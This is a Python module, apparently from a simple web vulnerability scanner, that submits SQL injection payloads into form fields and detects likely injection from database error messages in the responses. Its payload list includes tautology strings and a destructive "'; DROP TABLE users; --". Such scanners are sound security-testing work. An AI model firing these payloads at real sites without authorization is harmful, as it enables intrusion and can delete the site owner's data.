import requests
from core.requester import Requester
from report import json_manager
import json

SQL_PLAYLOADS = [
	"' OR '1'='1",
	"' OR 1=1 --",
	"'; DROP TABLE users; --"
]

Campos = ["text","password","email","textarea","search"]

CAMPOS_EVITABLES=["submit","hidden","button","reset","file","image"]

ERRORES_SQL = [ "sql syntax",
    "mysql",
    "syntax error",
    "warning",
    "unterminated",
    "odbc",
    "pdo",
    "database error"]

def envio_sql(method,url,direccion):
	with open(direccion,"r") as f:
		datos = json.load(f)
	
	base_data = {}
	for dato in datos["inputs"]:
		tipo = dato.get("tipo")
		name = dato.get("name")

		if name and tipo not in CAMPOS_EVITABLES:
			base_data[name] = "test"
			print(f"Campo valido {name}:{tipo}")

	#fuzzing
	req = Requester()
	for dato in datos["inputs"]:
		tipo = dato.get("tipo")
		name = dato.get("name")

		if not name or tipo in CAMPOS_EVITABLES:
			continue

		print(f"[+] Probando campos: {name}")
				
		for playload in SQL_PLAYLOADS:
			data_test = base_data.copy()
			data_test[name] = playload

			response = req.send(method, url, data=data_test)
			if not response:
				continue

			print(f"   ->  Playload: {playload}")

			#Deteccion por errores SQL
			vulnerable = False
			for error in ERRORES_SQL:
				if response and error.lower() in response.text.lower():
					vulnerable = True
					break

			if vulnerable:
				print(f"[!!!] Posible SQLI en {name}")
				json_manager.agregar_resultado(direccion,"vulnerabilidades",{
					"url": url,
					"method": method,
					"type": "SQLi",
					"campo": name,
					"payload": playload,
					"vulnerable": True
					})
			else:
				print(f"[+] SQLI seguro en {name}")
				json_manager.agregar_resultado(direccion,"vulnerabilidades",{
					"url": url,
					"method": method,
					"type": "SQLi",
					"campo": name,
					"payload": playload,
					"vulnerable": False
					})

